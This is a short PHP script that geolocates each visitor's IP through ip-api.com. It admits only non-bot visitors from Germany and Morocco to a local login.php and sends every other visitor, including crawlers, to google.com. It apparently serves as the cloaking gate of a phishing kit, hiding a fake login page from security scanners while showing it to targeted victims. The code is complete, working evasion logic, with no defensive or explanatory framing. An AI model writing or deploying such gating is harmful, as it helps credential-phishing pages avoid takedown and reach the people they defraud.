<?php

$ipinfo = file_get_contents("http://ip-api.com/json/".$_SERVER["REMOTE_ADDR"]);
$ipinfo_json = json_decode($ipinfo, true);


$country_code  = ["DE" , "MA"];
$country       = ["Germany" , "Morocco"];

if (in_array($ipinfo_json['countryCode'],$country_code) & in_array($ipinfo_json['country'],$country)) {
    if(stripos($_SERVER['HTTP_USER_AGENT'],'bot') === false){ 
        header('Location: ./login.php');
        exit();
    }else{
        header('Location: https://google.com/');
        exit();
    }
}else{
    header('Location: https://google.com/');
    exit();
}

?>
